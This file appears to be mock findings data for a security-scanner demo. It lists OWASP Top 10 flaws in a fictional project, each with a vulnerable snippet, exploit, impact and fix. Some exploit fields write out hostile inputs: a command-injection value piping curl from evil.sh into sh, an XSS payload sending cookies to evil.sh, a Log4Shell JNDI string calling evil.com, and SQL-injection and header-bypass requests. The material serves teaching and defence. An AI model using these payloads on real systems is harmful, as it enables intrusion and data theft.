import type { Finding } from '../types'

// Hallazgos de ejemplo para el análisis mock (Fase 1).
// Proyecto ficticio mixto: API Express (TS), backend Flask (Python),
// frontend JS y un microservicio legacy en Java.
export const MOCK_FINDINGS: Record<string, Finding[]> = {
  // ── A01 · Fallos de control de acceso ────────────────────────────────
  A01: [
    {
      id: 'A01-1',
      vulnId: 'A01',
      severity: 'critical',
      title: 'IDOR: perfil de cualquier usuario accesible sin comprobar el propietario',
      file: 'src/controllers/users.ts',
      line: 42,
      snippet: `app.get('/api/users/:id', async (req, res) => {
  const user = await db.exec('SELECT * FROM users WHERE id = ?', [req.params.id])
  res.json(user.rows[0]) // sin verificar que req.user.id === user.id
})`,
      exploit: 'Un atacante autenticado solo tiene que cambiar el parámetro (GET /api/users/1024) para leer el perfil, email y teléfono de cualquier otro usuario.',
      consequences: 'Exposición masiva de datos personales de clientes, incumplimiento de RGPD y phising dirigido a partir de esos datos.',
      solution: 'Comprobar siempre que el usuario autenticado es el propietario del recurso y devolver 403/404 en caso contrario.',
    },
    {
      id: 'A01-2',
      vulnId: 'A01',
      severity: 'high',
      title: 'Facturas ajenas legibles con cualquier sesión válida',
      file: 'src/controllers/invoices.ts',
      line: 18,
      snippet: `router.get('/api/invoices/:invoiceId', requireAuth, async (req, res) => {
  const invoice = await Invoice.findByPk(req.params.invoiceId)
  res.json(invoice) // el token de sesión basta para ver facturas ajenas
})`,
      exploit: 'Con una cuenta gratuita cualquiera, el atacante itera IDs (GET /api/invoices/1, /api/invoices/2…) y descarga facturas de otros clientes.',
      consequences: 'Filtración de datos de facturación (NIF/CIF, importes, productos comprados) y pérdida de confianza de la base de clientes.',
      solution: 'Vincular la factura al usuario autenticado en la consulta (WHERE user_id = :id) antes de devolverla.',
    },
    {
      id: 'A01-3',
      vulnId: 'A01',
      severity: 'high',
      title: 'Escala de privilegios por mass assignment en el registro',
      file: 'api/auth/register.py',
      line: 34,
      snippet: `def register(data: dict):
    user = User(**data)  # se asigna también 'role' si el cliente lo envía
    db.session.add(user)
    db.session.commit()`,
      exploit: 'POST /api/register con {"username":"malvado","password":"x","role":"admin"}: el campo role se copia a la base de datos y crea una cuenta de administrador.',
      consequences: 'Un atacante obtiene control total de la aplicación: gestión de usuarios, borrado de datos y exfiltración.',
      solution: 'Construir la entidad solo con campos explícitos permitidos (allowlist) y fijar role="user" en el registro.',
    },
    {
      id: 'A01-4',
      vulnId: 'A01',
      severity: 'medium',
      title: 'Endpoint de administración accesible con cualquier sesión',
      file: 'src/controllers/settings.ts',
      line: 9,
      snippet: `router.post('/api/settings', requireAuth, (req, res) => {
  // requireAuth solo comprueba que hay sesión; no el rol
  await Settings.update(req.body)
  res.json({ ok: true })
})`,
      exploit: 'Un usuario normal hace POST /api/settings con {"maintenanceMode": true} y deja la tienda fuera de línea, o altera la configuración de pagos.',
      consequences: 'Denegación de servicio por parte de usuarios legítimos y manipulación de la configuración de producción.',
      solution: 'Añadir un middleware de comprobación de rol (requireRole("admin")) a todas las rutas de administración.',
    },
    {
      id: 'A01-5',
      vulnId: 'A01',
      severity: 'medium',
      title: 'CORS abierto con credenciales activadas',
      file: 'src/middleware/cors.ts',
      line: 12,
      snippet: `app.use(cors({
  origin: '*',
  credentials: true, // permite que cualquier dominio lea las respuestas
}))`,
      exploit: 'Desde una web maliciosa (https://evil.com) se hace fetch a https://app.com/api/transferencias con credentials: "include" y las respuestas llegan sin bloqueo de CORS.',
      consequences: 'Exfiltración de datos financieros de la sesión de la víctima sin que ella lo perciba.',
      solution: 'Restringir origin a una allowlist de dominios propios y validar la cabecera Origin en el servidor.',
    },
  ],

  // ── A02 · Fallos criptográficos ──────────────────────────────────────
  A02: [
    {
      id: 'A02-1',
      vulnId: 'A02',
      severity: 'high',
      title: 'Contraseñas almacenadas con MD5 sin sal',
      file: 'api/auth/password.py',
      line: 22,
      snippet: `def hash_password(pw: str) -> str:
    return hashlib.md5(pw.encode()).hexdigest()  # MD5 sin sal`,
      exploit: 'Un atacante que roba la base de datos usa tablas arcoíris o una GPU (millones de MD5 por segundo): las contraseñas comunes caen en segundos.',
      consequences: 'Los usuarios reutilizan contraseñas en otros servicios, que quedan comprometidos en cadena.',
      solution: 'Usar un algoritmo de hash lento con sal individual por usuario (bcrypt, argon2id o scrypt).',
    },
    {
      id: 'A02-2',
      vulnId: 'A02',
      severity: 'medium',
      title: 'Formulario de login servido por HTTP en claro',
      file: 'nginx/default.conf',
      line: 27,
      snippet: `server {
    listen 80;
    location /login {
        proxy_pass http://127.0.0.1:8000;  # sin redirección a HTTPS
    }
}`,
      exploit: 'En una red Wi-Fi no segura, un atacante en modo promiscuo captura el POST /login con usuario y contraseña en texto plano.',
      consequences: 'Robo masivo de credenciales de cualquiera que se conecte desde una red comprometida (café, aeropuerto, hotel).',
      solution: 'Forzar HTTPS con redirección 301 y cabecera HSTS; servir todo el tráfico únicamente en 443.',
    },
    {
      id: 'A02-3',
      vulnId: 'A02',
      severity: 'medium',
      title: 'Tarjetas cifradas con AES en modo ECB',
      file: 'src/crypto/token.ts',
      line: 15,
      snippet: `const cipher = crypto.createCipheriv('aes-256-ecb', KEY, null)
return cipher.update(pan, 'utf8', 'base64') // el PAN en modo ECB`,
      exploit: 'ECB no oculta patrones: dos bloques con los mismos dígitos (mismo emisor y mes) producen el mismo bloque cifrado, permitiendo agrupar y deducir fragmentos del número.',
      consequences: 'Infracción de PCI-DSS y posibilidad de reconstruir parte de los números de tarjeta almacenados.',
      solution: 'Usar un modo de operación con IV aleatorio (AES-GCM o AES-256-CBC) e integridad verificada con un MAC.',
    },
    {
      id: 'A02-4',
      vulnId: 'A02',
      severity: 'low',
      title: 'Tokens de sesión generados con Math.random()',
      file: 'src/utils/tokens.ts',
      line: 8,
      snippet: `function generarToken() {
  return Math.random().toString(36).slice(2)  // no es criptográficamente seguro
}`,
      exploit: 'Math.random() usa un PRNG determinista: conociendo un par de tokens emitidos, el atacante predice el siguiente y toma la sesión.',
      consequences: 'Secuestro de sesiones de usuarios sin que se produzca ningún fallo evidente en el sistema.',
      solution: 'Generar tokens con un CSPRNG (crypto.randomBytes() en Node o crypto.getRandomValues() en el navegador).',
    },
  ],

  // ── A03 · Inyección ──────────────────────────────────────────────────
  A03: [
    {
      id: 'A03-1',
      vulnId: 'A03',
      severity: 'critical',
      title: 'SQL injection en el buscador de productos',
      file: 'src/controllers/products.ts',
      line: 31,
      snippet: `const q = \`SELECT * FROM products WHERE name LIKE '%\${req.query.q}%'\`
const rows = await db.exec(q)  // el parámetro q se concatena tal cual`,
      exploit: "GET /api/products?q=%27%20OR%201=1-- devuelve todo el catálogo; con UNION SELECT y subconsultas se lee la tabla users (contraseñas, emails).",
      consequences: 'Exfiltración de la base de datos completa y, con configuraciones permisivas del motor, ejecución de comandos en el servidor (RCE).',
      solution: 'Usar consultas parametrizadas (db.exec("SELECT … WHERE name LIKE ?", [q])) y nunca concatenar la entrada del usuario.',
    },
    {
      id: 'A03-2',
      vulnId: 'A03',
      severity: 'high',
      title: 'Inyección de comandos en el generador de copias',
      file: 'api/utils/backup.py',
      line: 12,
      snippet: `def exportar_csv(nombre: str):
    os.system(f"mysqldump tienda {nombre} > /backups/{nombre}.sql")  # f-string a shell`,
      exploit: 'POST /api/export {"nombre": "x; curl http://evil.sh/x.sh | sh"} hace ejecutar el payload en el servidor con los permisos del worker.',
      consequences: 'Ejecución remota de código (RCE): el atacante obtiene control del servidor y de la base de datos.',
      solution: 'Usar subprocess con lista de argumentos (sin shell=True) y validar el nombre contra un allowlist estricto (^[a-z0-9_-]{1,64}$).',
    },
    {
      id: 'A03-3',
      vulnId: 'A03',
      severity: 'high',
      title: 'XSS reflejado en la sección de comentarios',
      file: 'src/controllers/comments.ts',
      line: 24,
      snippet: `res.send(\`
  <div>\${req.body.comment}</div>  <!-- el comentario se inserta sin escapar -->
\`)`,
      exploit: "GET /comentarios?msg=<script>fetch('https://evil.sh?c='+document.cookie)</script> ejecuta JavaScript en el navegador de quien abra el enlace.",
      consequences: 'Robo de cookies de sesión y ejecución de acciones en nombre del usuario (robo de sesión, pagos no autorizados).',
      solution: 'Escapar siempre la salida en el contexto HTML y aplicar Content-Security-Policy como segunda línea de defensa.',
    },
    {
      id: 'A03-4',
      vulnId: 'A03',
      severity: 'medium',
      title: 'Inyección en logs (CRLF) en el logger de peticiones',
      file: 'src/middleware/requestLogger.ts',
      line: 19,
      snippet: `logger.info(\`GET \${req.originalUrl} — IP \${req.ip}\`)
// originalUrl llega del cliente: un \\n permite forjar líneas nuevas`,
      exploit: 'GET /%0a2026-11-20%2012:00:00%20INFO%20usuario%20admin%20desbloqueado%0d hace que el atacante escriba líneas falsas en el log como actividad legítima.',
      consequences: 'Falsificación de la auditoría: borrar el rastro de un ataque o hacer que parezca que un incidente no ocurrió.',
      solution: 'Sanitizar la entrada al registrarla (eliminar \\n y \\r) y usar logs estructurados que separen los campos.',
    },
    {
      id: 'A03-5',
      vulnId: 'A03',
      severity: 'low',
      title: 'ReDoS: expresión regular con grupos anidados',
      file: 'src/validation/email.ts',
      line: 6,
      snippet: `const emailRe = /^([a-z0-9.]+)+@([a-z0-9.]+)+\\.[a-z]{2,}$/i  // anidación de +`,
      exploit: 'POST /api/register con un email de ~500 caracteres (aaaaa…a@) dispara backtracking exponencial y bloquea el worker durante minutos.',
      consequences: 'Denegación de servicio en el proceso de registro: todos los usuarios que comprueban su email quedan bloqueados.',
      solution: 'Simplificar la expresión (sin grupos anidados con +) o usar un validador de emails probado con límite de longitud.',
    },
  ],

  // ── A04 · Diseño inseguro ────────────────────────────────────────────
  A04: [
    {
      id: 'A04-1',
      vulnId: 'A04',
      severity: 'high',
      title: 'Recuperación de contraseña sin límites de intentos',
      file: 'src/controllers/account.ts',
      line: 55,
      snippet: `app.post('/api/password-reset', async (req, res) => {
  // sin rate limit; además responde distinto si el email existe o no
  const user = await User.findByEmail(req.body.email)
  if (!user) return res.status(404).json({ error: 'email no registrado' })
  ...`,
      exploit: 'El atacante descubre qué emails están registrados (respuesta 404) y prueba tokens de reseteo a velocidad de diccionario sin ser frenado.',
      consequences: 'Toma de control de cuentas a escala, en especial las de mayor valor (directivos, cuentas empresariales).',
      solution: 'Añadir rate limiting, expiración corta del enlace (15 min, un solo uso) y responder igual exista o no el email.',
    },
    {
      id: 'A04-2',
      vulnId: 'A04',
      severity: 'medium',
      title: 'Descuento por cantidad negativa en el carrito',
      file: 'src/services/cart.ts',
      line: 40,
      snippet: `const lineTotal = item.price * item.qty   // sin validar qty: una negativa resta del total
order.total += lineTotal`,
      exploit: 'Con qty: -50 en un producto de 100 €, la línea suma -5000 € al pedido: el total final queda negativo y la mercancía se cobra gratis (o se abona al cliente).',
      consequences: 'Pérdida directa de ingresos y distorsión del inventario; el fraude pasa desapercibido para operaciones.',
      solution: 'Validar los invariantes de negocio en el servidor (qty >= 1, total >= 0) y no confiar en el cliente para los cálculos.',
    },
    {
      id: 'A04-3',
      vulnId: 'A04',
      severity: 'medium',
      title: 'Condición de carrera en el cupón de promoción',
      file: 'src/services/checkout.ts',
      line: 71,
      snippet: `const used = await Coupon.usedCount(req.body.code)
if (used < 100) {              // comprobación y escritura no atómicas
  await Coupon.incrementUsage(req.body.code)`,
      exploit: 'Con 20 peticiones simultáneas al checkout, todas leen used=99 y pasan el check: el cupón, previsto para 100 usos, se aplica 119 veces.',
      consequences: 'Descuentos no presupuestados y fraude sistémico entre usuarios coordinados.',
      solution: 'Hacer comprobación y incremento atómicos (UPDATE … WHERE usos < 100) o usar un lock de fila.',
    },
    {
      id: 'A04-4',
      vulnId: 'A04',
      severity: 'low',
      title: 'Operaciones sensibles sin verificación adicional (step-up)',
      file: 'src/controllers/billing.ts',
      line: 16,
      snippet: `router.post('/api/billing/account', requireAuth, (req, res) => {
  // cambiar la IBAN de cobro con la sesión normal, sin paso extra
  await Billing.update(req.user.id, req.body.iban)`,
      exploit: 'Con la sesión robada (por phishing o XSS), el atacante cambia la IBAN de cobro de la víctima sin que se le vuelva a pedir la contraseña.',
      consequences: 'Desvío de pagos a la cuenta del atacante sin que la víctima reciba ninguna alerta.',
      solution: 'Exigir verificación en dos pasos (código TOTP o reautenticación) para operaciones de alto impacto.',
    },
  ],

  // ── A05 · Configuración insegura ─────────────────────────────────────
  A05: [
    {
      id: 'A05-1',
      vulnId: 'A05',
      severity: 'high',
      title: 'Modo debug activo en producción',
      file: 'config/settings.production.yaml',
      line: 8,
      snippet: `app:
  debug: true           # activo en producción
  log_level: DEBUG`,
      exploit: 'Ante cualquier error 500, el framework devuelve una página de depuración con rutas, variables de entorno, credenciales de base de datos y versiones.',
      consequences: 'El atacante obtiene el mapa completo de la aplicación y las credenciales internas, acelerando cualquier ataque posterior.',
      solution: 'Desactivar debug en producción (debug: false) y devolver una página de error genérica.',
    },
    {
      id: 'A05-2',
      vulnId: 'A05',
      severity: 'medium',
      title: 'Credenciales por defecto en la configuración de la BD',
      file: 'config/database.yaml',
      line: 14,
      snippet: `admin:
  user: admin
  password: admin123     # credenciales por defecto del instalador`,
      exploit: 'Un atacante dentro de la red interna (o que llega al puerto de la BD) prueba credenciales conocidas y entra con admin/admin123.',
      consequences: 'Control de la base de datos: robo o borrado masivo de todos los datos.',
      solution: 'Generar credenciales únicas en el despliegue, guardarlas en un gestor de secretos y rotarlas periódicamente.',
    },
    {
      id: 'A05-3',
      vulnId: 'A05',
      severity: 'medium',
      title: 'Stack traces devueltos a los clientes',
      file: 'src/middleware/errorHandler.ts',
      line: 21,
      snippet: `app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.stack })  // pila completa al cliente
})`,
      exploit: 'El atacante provoca errores intencionados (JSON malformado, rutas inexistentes) y recoge los stack traces: rutas de archivo, dependencias y versiones exactas.',
      consequences: 'Ingeniería de precisión para el ataque: se conocen exactamente qué CVEs aplicar contra el stack.',
      solution: 'Devolver mensajes genéricos al cliente y registrar el detalle solo en logs internos.',
    },
    {
      id: 'A05-4',
      vulnId: 'A05',
      severity: 'low',
      title: 'Documentación de la API (Swagger) pública en producción',
      file: 'src/app.ts',
      line: 12,
      snippet: `app.use('/docs', swaggerUi.serve)  // API expuesta sin autenticar`,
      exploit: 'El atacante explora /docs y descubre todos los endpoints, parámetros y formatos de respuesta, incluidos los internos.',
      consequences: 'La propia aplicación regala el mapa de la superficie de ataque al atacante.',
      solution: 'Montar la documentación solo en entornos de desarrollo o detrás de autenticación.',
    },
  ],

  // ── A06 · Componentes vulnerables u obsoletos ────────────────────────
  A06: [
    {
      id: 'A06-1',
      vulnId: 'A06',
      severity: 'critical',
      title: 'Log4Shell: log4j-core 2.14.1 con RCE conocido',
      file: 'services/notificaciones/pom.xml',
      line: 24,
      snippet: `<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>  <!-- CVE-2021-45045: RCE por JNDI lookup -->
</dependency>`,
      exploit: 'Cualquier entrada que pase al log (user-agent, nombre de usuario) con ${jndi:ldap://evil.com/a} hace que el servidor pida un LDAP al atacante y ejecute su código.',
      consequences: 'RCE sin autenticación: control total del microservicio y salto lateral a la red interna desde la que opera.',
      solution: 'Actualizar a log4j-core >= 2.17.1, desactivar los lookups JNDI y auditar las dependencias transitivas.',
    },
    {
      id: 'A06-2',
      vulnId: 'A06',
      severity: 'high',
      title: 'minimist 1.2.5 con prototype pollution (CVE-2021-44906)',
      file: 'package.json',
      line: 31,
      snippet: `"dependencies": {
  "minimist": "1.2.5",   // CVE-2021-44906: prototype pollution
  ...`,
      exploit: 'Con --__proto__.admin=true (o su equivalente en la API), se inyecta isAdmin: true en Object.prototype y todos los objetos de la app lo heredan.',
      consequences: 'Escalada de privilegios: cualquier usuario se convierte en admin en memoria sin autenticarse.',
      solution: 'Actualizar a minimist >= 1.2.6 y ejecutar npm audit (con Renovate o dependabot) en el pipeline.',
    },
    {
      id: 'A06-3',
      vulnId: 'A06',
      severity: 'medium',
      title: 'Express 4.17.1, cinco años sin parches de seguridad',
      file: 'package.json',
      line: 18,
      snippet: `"express": "4.17.1",   // sin parches publicados desde 2019 (p. ej. CVE-2024-29041)`,
      exploit: 'El atacante aprovecha el open redirect no parcheado (CVE-2024-29041) para redirigir a la víctima a un clon del login que captura sus credenciales.',
      consequences: 'Phishing de alto éxito y exposición acumulada a todos los CVEs de un componente obsoleto.',
      solution: 'Actualizar a la última versión de Express (4.21.x) y mantener las dependencias al día.',
    },
    {
      id: 'A06-4',
      vulnId: 'A06',
      severity: 'low',
      title: 'Dependencia en desuso: request 2.88.2',
      file: 'package.json',
      line: 38,
      snippet: `"request": "2.88.2",  // marcado deprecated desde 2020, sin mantenimiento`,
      exploit: 'request está en desuso: sus CVEs (p. ej. fuga de credenciales en redirecciones) no se van a parchear nunca y el riesgo se acumula.',
      consequences: 'Superficie de riesgo permanente que nadie mantiene: cada CVE nuevo es un riesgo sin remedio posible.',
      solution: 'Migrar a un cliente HTTP mantenido (undici o axios actualizado) y añadir una política para dependencias deprecated.',
    },
  ],

  // ── A07 · Identificación y autenticación ─────────────────────────────
  A07: [
    {
      id: 'A07-1',
      vulnId: 'A07',
      severity: 'critical',
      title: 'Bypass de autenticación: la cabecera X-User-Id decide la identidad',
      file: 'src/middleware/session.ts',
      line: 29,
      snippet: `const isAuthed = req.headers['x-user-id']  // confía en una cabecera del cliente
if (!isAuthed) return res.status(401).end()`,
      exploit: "curl -H 'X-User-Id: 1' https://app.com/api/admin: cualquier petición sin sesión se considera autenticada como el usuario 1 (el administrador).",
      consequences: 'Acceso total como administrador sin credenciales: gestión de usuarios, borrado de datos y exfiltración.',
      solution: 'Derivar la identidad únicamente de una sesión validada en el servidor (JWT firmado o cookie httpOnly), nunca de cabeceras del cliente.',
    },
    {
      id: 'A07-2',
      vulnId: 'A07',
      severity: 'high',
      title: 'Clave de producción de la pasarela de pagos en el código',
      file: 'src/services/paymentClient.ts',
      line: 11,
      snippet: `const API_KEY = 'sk_live_51Gx9aB2cD3eF4gH5iJ6k'
const GATEWAY = 'https://api.bancoservicio.com'`,
      exploit: 'Cualquiera con acceso al repo (incluido un fork público) extrae la clave en vivo y realiza cargos o reembolsos con ella.',
      consequences: 'Fraude financiero directo: cargos no autorizados a clientes y reversales que el banco no cubre.',
      solution: 'Mover la clave a un gestor de secretos del entorno (nunca al código) y rotarla ya, asumiéndola comprometida.',
    },
    {
      id: 'A07-3',
      vulnId: 'A07',
      severity: 'high',
      title: 'Secret de JWT débil y adivinable',
      file: 'config/jwt.yaml',
      line: 5,
      snippet: `signing:
  algorithm: HS256
  secret: "supersecreto123"   // 15 caracteres de diccionario`,
      exploit: 'Con HS256 el atacante prueba el secret por fuerza bruta (hashcat, millones de candidatos por segundo) y firma sus propios JWTs de admin.',
      consequences: 'Falsificación de tokens: el atacante se autentica como cualquier usuario, incluido el administrador.',
      solution: 'Usar un secreto aleatorio de >= 256 bits (o RS256 con clave privada en un HSM) y rotarlo periódicamente.',
    },
    {
      id: 'A07-4',
      vulnId: 'A07',
      severity: 'medium',
      title: 'Sesiones JWT válidas 30 días y sin revocación',
      file: 'src/services/session.ts',
      line: 47,
      snippet: `// los tokens se emiten con expiración de 30 días y nunca se revocan:
jwt.sign(payload, secret, { expiresIn: '30d' })`,
      exploit: 'Un token robado hoy sigue funcionando 30 días, incluso si la víctima cambió la contraseña o el empleado fue dado de baja.',
      consequences: 'Ventana enorme de exposición: el atacante mantiene el acceso a la cuenta de la víctima durante semanas.',
      solution: 'Reducir la expiración (15 min) con refresh tokens revocables e invalidar todas las sesiones al cambiar la contraseña.',
    },
    {
      id: 'A07-5',
      vulnId: 'A07',
      severity: 'low',
      title: 'Recuperación de cuenta únicamente por SMS',
      file: 'api/auth/recovery.py',
      line: 40,
      snippet: `sms.send(phone, f"Tu código de recuperación es {code6}")  # único método`,
      exploit: 'Con un SIM-swap (ingeniería social al operador), el atacante recibe los SMS de la víctima y recupera la cuenta con su propio teléfono.',
      consequences: 'Toma de control de cuentas, en especial las asociadas a dinero o a datos sensibles.',
      solution: 'Ofrecer métodos de recuperación alternativos (email + TOTP de respaldo) y alertar al usuario ante cambios de teléfono.',
    },
  ],

  // ── A08 · Integridad del software ────────────────────────────────────
  A08: [
    {
      id: 'A08-1',
      vulnId: 'A08',
      severity: 'medium',
      title: 'El despliegue no construye: descarga un binario de terceros',
      file: '.github/workflows/deploy.yml',
      line: 23,
      snippet: `- name: Subir artefacto
  run: curl -sSL https://cdn.ejemplo.io/nexo-2.4.1.tar.gz | tar xz`,
      exploit: 'Un atacante que compromete el CDN (o un dominio similar) sustituye el tar.gz por uno con backdoor y todos los despliegues la propagan.',
      consequences: 'Backdoor persistente en producción, desconocida para un equipo que no verifica la proveniencia del binario.',
      solution: 'Construir el artefacto en CI desde el código fuente y verificar su firma (sigstore/cosign) antes de desplegar.',
    },
    {
      id: 'A08-2',
      vulnId: 'A08',
      severity: 'low',
      title: 'Instalación de dependencias desde un espejo no verificado',
      file: 'Makefile',
      line: 12,
      snippet: `npm:
\tnpm install --registry=https://mirror.interno.corp  # sin verificar integridad`,
      exploit: 'Si el espejo interno se compromete (o el proxy reescribe paquetes), los paquetes maliciosos se instalan con confianza plena en cada build.',
      consequences: 'Inyección de código en la cadena de suministro: backdoors o miners presentes en cada despliegue.',
      solution: 'Instalar con npm ci (lockfile + hashes de integridad) y restringir el registry a uno oficial y firmado.',
    },
    {
      id: 'A08-3',
      vulnId: 'A08',
      severity: 'low',
      title: 'CI sin puertas de seguridad (sin SAST, sin audit, sin secret scan)',
      file: '.github/workflows/ci.yml',
      line: 31,
      snippet: `- run: npm test
# sin etapas de auditoría: los CVEs y los secretos entran sin frenos`,
      exploit: 'Un desarrollador sube un commit con una dependencia vulnerable o una API key: nada lo detiene y el código llega a producción.',
      consequences: 'Vulnerabilidades y credenciales reales llegan a producción de forma rutinaria y se detectan tarde.',
      solution: 'Añadir etapas que bloqueen el merge: npm audit --audit-level=high, gitleaks y un escáner SAST en cada PR.',
    },
  ],

  // ── A09 · Registro y monitorización ──────────────────────────────────
  A09: [
    {
      id: 'A09-1',
      vulnId: 'A09',
      severity: 'medium',
      title: 'Fracasos de login sin registrar',
      file: 'api/auth/login.py',
      line: 18,
      snippet: `if not user.check_password(pw):
    return jsonify(error="credenciales inválidas"), 401  # sin log del intento`,
      exploit: 'Un atacante fuerza la contraseña por diccionario (millones de intentos) y deja cero rastro: nadie detecta el forceo hasta que es tarde.',
      consequences: 'Compromiso de cuentas sin alertas: el tiempo medio de detección pasa de minutos a semanas.',
      solution: 'Registrar cada intento fallido (usuario, IP, timestamp) y alertar al superar umbrales por cuenta o por IP.',
    },
    {
      id: 'A09-2',
      vulnId: 'A09',
      severity: 'medium',
      title: 'Tokens y cabeceras completas en los logs',
      file: 'src/middleware/requestLogger.ts',
      line: 25,
      snippet: `logger.debug('auth', { headers: req.headers })  // incluye 'authorization: Bearer …'`,
      exploit: 'Cualquiera con acceso a los logs (plataforma de observabilidad, soporte, subcontratista) extrae los Bearer tokens activos y los reutiliza.',
      consequences: 'Los logs, pensados como herramienta defensiva, se convierten en la fuente del robo de credenciales.',
      solution: 'Mascarar los campos sensibles (authorization, cookie, password) antes de registrarlos y limitar el nivel a info en producción.',
    },
    {
      id: 'A09-3',
      vulnId: 'A09',
      severity: 'low',
      title: 'Sin alertas: los incidentes se descubren por el cliente',
      file: 'config/observability.yaml',
      line: 9,
      snippet: `alerts:
  enabled: false   # hay métricas, pero ninguna dispara una alerta`,
      exploit: 'Un ataque de fuerza bruta o una exfiltración en curso no genera ninguna notificación: el equipo lo descubre cuando un usuario avisa.',
      consequences: 'Tiempo de respuesta máximo: el atacante opera sin presión durante horas o días.',
      solution: 'Definir alertas sobre umbrales (5xx, intentos fallidos, tráfico anómalo) y derivarlas a un canal con respuesta.',
    },
  ],

  // ── A10 · Suplantición de servidor (SSRF) — sin hallazgos a propósito ─
  A10: [],
}
